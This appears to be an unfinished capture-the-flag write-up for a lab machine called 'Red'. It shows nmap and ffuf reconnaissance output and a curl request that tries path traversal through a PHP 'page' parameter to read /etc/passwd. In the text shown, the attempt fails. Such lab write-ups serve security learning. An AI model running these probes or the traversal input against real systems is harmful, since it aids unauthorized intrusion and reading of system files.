# Red

Starting the challenge we do some active reconnaissance:

Nmap Scan:
```sh
nmap -sV $IP                                                              
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 19:59 CEST
Nmap scan report for $IP  
Host is up (0.066s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
```

Directory Scanning:
```sh
ffuf -u http://$IP/FUZZ -w ../../../webhacking/wordlists/directory_scanner/common.txt                   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://$IP/FUZZ
 :: Wordlist         : FUZZ: /home/kali/webhacking/wordlists/directory_scanner/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 70ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1623ms]
    * FUZZ: .htaccess

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2627ms]
    * FUZZ: .hta

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 69ms]
    * FUZZ: assets

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 78ms]
    * FUZZ: index.php

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 72ms]
    * FUZZ: server-status

:: Progress: [4613/4613] :: Job [1/1] :: 560 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

This doesn't look like a lot of information and although we found /assets/ it didn't lead to anything of interest, so let's just take a look.

Curl on Website:
```
curl -vvv $IP                                                                                                              
*   Trying $IP:80...
* Connected to $IP ($IP) port 80 (#0)
> GET / HTTP/1.1
> Host: $IP
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Fri, 06 Oct 2023 18:03:51 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Location: /index.php?page=home.html
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host $IP left intact
```

Interesting, it seems like we instantly get a redirect to `/index.php?page=home.html`.

The first thing catching my Eye is the page search with PHP. 
There are some known vulnerabilities like path traversal and other stuff so let's try this.
```
curl -vvv http://$IP/index.php?page=../../../etc/passwd
*   Trying $IP:80...
* Connected to $IP ($IP) port 80 (#0)
> GET /index.php?page=../../../etc/passwd HTTP/1.1
> Host: $IP
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Fri, 06 Oct 2023 18:07:37 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Location: /index.php?page=home.html
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host $IP left intact
```

Seems like this didn't work and after trying other variations it seems that nothing is working. The second thing I want to try is using filters because maybe this is blocking a valid output.



